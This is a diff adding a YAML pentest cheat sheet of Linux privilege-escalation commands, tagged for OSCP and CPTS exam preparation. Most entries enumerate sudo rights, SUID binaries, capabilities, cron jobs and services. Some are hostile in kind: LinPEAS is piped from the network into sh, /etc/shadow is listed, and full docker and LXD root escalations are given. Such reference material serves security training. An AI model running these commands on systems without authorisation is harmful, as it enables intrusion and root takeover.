@@ -1,0 +1,121 @@
+category: "privesc-linux"
+description: "Linux privilege escalation techniques"
+commands:
+  - name: "linpeas"
+    description: "Run LinPEAS enumeration script"
+    command: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+    tool: "linpeas"
+    tags: ["privesc", "linux", "enum", "auto"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Transfer to target first. Use python http.server or curl"
+
+  - name: "sudo-list"
+    description: "Check sudo permissions"
+    command: "sudo -l"
+    tool: "sudo"
+    tags: ["privesc", "linux", "sudo"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "First thing to check! Look for NOPASSWD entries"
+
+  - name: "suid-find"
+    description: "Find SUID binaries"
+    command: "find / -perm -4000 -type f 2>/dev/null"
+    tool: "find"
+    tags: ["privesc", "linux", "suid"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Check each against GTFOBins"
+
+  - name: "capabilities-find"
+    description: "Find binaries with capabilities"
+    command: "getcap -r / 2>/dev/null"
+    tool: "getcap"
+    tags: ["privesc", "linux", "capabilities"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "writable-files"
+    description: "Find world-writable files"
+    command: "find / -writable -type f 2>/dev/null | grep -v '/proc\\|/sys\\|/dev'"
+    tool: "find"
+    tags: ["privesc", "linux", "writable"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "cron-enum"
+    description: "Enumerate cron jobs"
+    command: "cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null"
+    tool: "linux"
+    tags: ["privesc", "linux", "cron"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "internal-services"
+    description: "Find internal-only services"
+    command: "ss -tlnp"
+    tool: "ss"
+    tags: ["privesc", "linux", "services", "internal"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Look for services bound to 127.0.0.1"
+
+  - name: "passwd-writable"
+    description: "Check if /etc/passwd is writable"
+    command: "ls -la /etc/passwd /etc/shadow 2>/dev/null"
+    tool: "linux"
+    tags: ["privesc", "linux", "passwd"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "kernel-version"
+    description: "Check kernel version for exploits"
+    command: "uname -a; cat /etc/os-release"
+    tool: "linux"
+    tags: ["privesc", "linux", "kernel"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "path-hijack"
+    description: "Check PATH for hijacking opportunities"
+    command: "echo $PATH; find / -writable -type d 2>/dev/null | head -20"
+    tool: "linux"
+    tags: ["privesc", "linux", "path"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "pspy-processes"
+    description: "Monitor processes without root (pspy)"
+    command: "./pspy64"
+    tool: "pspy"
+    tags: ["privesc", "linux", "processes", "monitor"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Transfer pspy to target. Reveals cron and other user processes"
+
+  - name: "gtfobins-sudo"
+    description: "GTFOBins sudo exploit template"
+    command: "sudo {BINARY} (check https://gtfobins.github.io/)"
+    tool: "gtfobins"
+    tags: ["privesc", "linux", "sudo", "gtfobins"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    references: ["https://gtfobins.github.io/"]
+
+  - name: "docker-privesc"
+    description: "Docker group privilege escalation"
+    command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    tool: "docker"
+    tags: ["privesc", "linux", "docker"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Only if user is in docker group"
+
+  - name: "lxd-privesc"
+    description: "LXD group privilege escalation"
+    command: "lxc init ubuntu:22.04 privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc -- /bin/bash"
+    tool: "lxd"
+    tags: ["privesc", "linux", "lxd"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
